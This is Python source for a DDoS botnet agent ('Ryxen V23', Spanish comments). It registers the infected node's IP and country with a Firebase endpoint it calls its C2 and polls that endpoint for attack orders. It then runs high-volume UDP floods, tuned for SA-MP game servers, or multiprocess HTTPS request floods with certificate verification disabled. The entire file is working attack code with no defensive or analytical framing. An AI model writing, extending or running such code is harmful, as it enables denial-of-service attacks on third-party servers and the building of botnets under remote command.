import asyncio
import aiohttp
import time
import random
import ssl
import socket
import threading
import multiprocessing
import os
import sys

# RYXEN NEURAL AGENT V23 - FULL POWER
DB_URL = "https://ryxen-c2-default-rtdb.firebaseio.com/attack.json"
NODES_URL = "https://ryxen-c2-default-rtdb.firebaseio.com/nodes"

def get_node_info_secure():
    try:
        # Usamos un timeout largo para evitar que el nodo se cuelgue al iniciar
        import requests
        r = requests.get('http://ip-api.com/json/', timeout=10).json()
        return r.get('query', '0.0.0.0'), r.get('countryCode', 'UN')
    except:
        return "0.0.0.0", "UN"

# --- MOTOR CAPA 4: UDP & SAMP (Saturación de Ancho de Banda) ---
def udp_high_performance(target_ip, target_port, end_time):
    # Creamos el socket fuera del bucle para ahorrar CPU
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # Payload de 1200 bytes: El tamaño ideal para no fragmentar y saturar Gbps
    payload = random._urandom(1200)
    
    while time.time() < end_time:
        try:
            # Enviamos ráfagas directas al puerto (7777 para SAMP)
            sock.sendto(payload, (target_ip, int(target_port)))
        except socket.error:
            time.sleep(0.01) # Breve respiro si el buffer del SO se llena
        except:
            pass

# --- MOTOR CAPA 7: HTTPS & TLS SPAM (RPS Máximos) ---
async def start_l7_flood(target, end_time, semaphore):
    # Configuración de cifrado ultra-rápida
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ctx.set_ciphers('AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256')
    
    # Connector con caché de DNS para no perder tiempo resolviendo la IP
    conn = aiohttp.TCPConnector(limit=0, ssl=ctx, family=socket.AF_INET, ttl_dns_cache=1000)
    
    async with aiohttp.ClientSession(connector=conn) as session:
        while time.time() < end_time:
            async with semaphore:
                try:
                    headers = {
                        'User-Agent': f'Ryxen-V23-Bot-{random.randint(1000,9999)}',
                        'Accept-Encoding': 'gzip, deflate',
                        'Connection': 'keep-alive'
                    }
                    async with session.get(target, headers=headers, timeout=1, allow_redirects=False) as r:
                        # Liberamos la conexión inmediatamente sin leer el body
                        r.close()
                except:
                    continue

def run_async_process(target, end_time):
    # Iniciamos un nuevo loop de eventos por cada proceso de CPU
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    # Semáforo de 25,000 para permitir ráfagas brutales
    sem = asyncio.Semaphore(25000)
    # 300 hilos lógicos por proceso
    tasks = [start_l7_flood(target, end_time, sem) for _ in range(300)]
    loop.run_until_complete(asyncio.gather(*tasks))

async def main():
    ip, cc = get_node_info_secure()
    nid = f"RX-{cc}-{random.randint(100,999)}"
    print(f"[*] Nodo {nid} conectado. Cores detectados: {multiprocessing.cpu_count()}")
    
    async with aiohttp.ClientSession() as session:
        # Reporte de estado inicial
        await session.put(f"{NODES_URL}/{nid}.json", json={"id": nid, "ip": ip, "cc": cc, "t": time.time()})
        
        last_stamp = ""
        while True:
            try:
                # Polling de comando
                async with session.get(DB_URL, timeout=5) as r:
                    data = await r.json()
                
                if data and data.get('stamp') != last_stamp:
                    last_stamp = data['stamp']
                    method = data['method']
                    target = data['target']
                    duration = int(data['time'])
                    
                    if duration > 0:
                        end_attack = time.time() + duration
                        print(f"[!] Ejecutando {method} por {duration}s...")
                        
                        if ".udp" in method or ".samp" in method:
                            h, p = target.split(':')
                            # Lanzamos 300 hilos de inundación UDP
                            for _ in range(300):
                                threading.Thread(target=udp_high_performance, args=(h, p, end_attack), daemon=True).start()
                        else:
                            # Multiprocesamiento para saltar el límite de Python
                            for _ in range(multiprocessing.cpu_count()):
                                multiprocessing.Process(target=run_async_process, args=(target, end_attack), daemon=True).start()
            except:
                pass
            await asyncio.sleep(1)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        sys.exit()

